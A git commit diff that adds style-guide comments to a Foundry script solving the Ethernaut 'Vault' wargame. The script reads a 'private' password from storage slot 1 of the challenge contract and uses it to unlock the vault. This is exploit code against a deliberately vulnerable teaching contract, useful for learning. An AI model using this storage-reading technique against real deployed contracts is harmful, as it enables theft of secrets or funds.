646192b201c5255ff24633e2292b89e526570f25
Alexander Gadzhalov <alexander.gadzhalov@limechain.tech>
2024-11-06 21:47:08 +0200

    docs(Vault): style guide and comments

--- script/Vault.s.sol
+++ script/Vault.s.sol
@@ -2,22 +2,33 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import "../src/Vault.sol";
+import {Vault} from "../src/Vault.sol";
 
+/// @author agadzhalov
+/// @title Solution to Vault Ethernaut challenge
+/// @notice Solution: 
+///         One slot consists of 32 bytes. 
+///         The `bool locked` is 1 byte, but `bytes32 password` is 32 bytes, which is why the password is stored at slot 1. 
+///         p.s. Casting storage contract address slot can also be used for this exploit.
 contract VaultScript is Script {
-
+    /// @notice Instance of the Vault contract to interact with.
     Vault public vault = Vault(0xC41711FE786fd26315A923C24DEE84cE19AF5213);
-    /**
-     * Solution: One slot consists of 32 bytes.
-     * bool locked is 1 byte, but bytes32 password is 32 bytes, that's why the password is stored on slot 1
-     * p.s. cast storage contract-adress slot also can be used
-     */
+
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        console.log("1. Locked status", vault.locked());
-        bytes32 passwordBytes = vm.load(address(vault), bytes32(uint256(1))); // get's the bytes at slot 1
+
+        // Log the current lock status of the Vault contract
+        console.log("1. Locked status:", vault.locked());
+
+        // Load the password from slot 1 in the Vault contract's storage
+        bytes32 passwordBytes = vm.load(address(vault), bytes32(uint256(1))); // gets the bytes at slot 1
+
+        // Unlock the Vault using the loaded password
         vault.unlock(passwordBytes);
-        console.log("2. Locked status", vault.locked());
+
+        // Log the new lock status of the Vault contract after unlocking
+        console.log("2. Locked status:", vault.locked());
+
         vm.stopBroadcast();
     }
 }
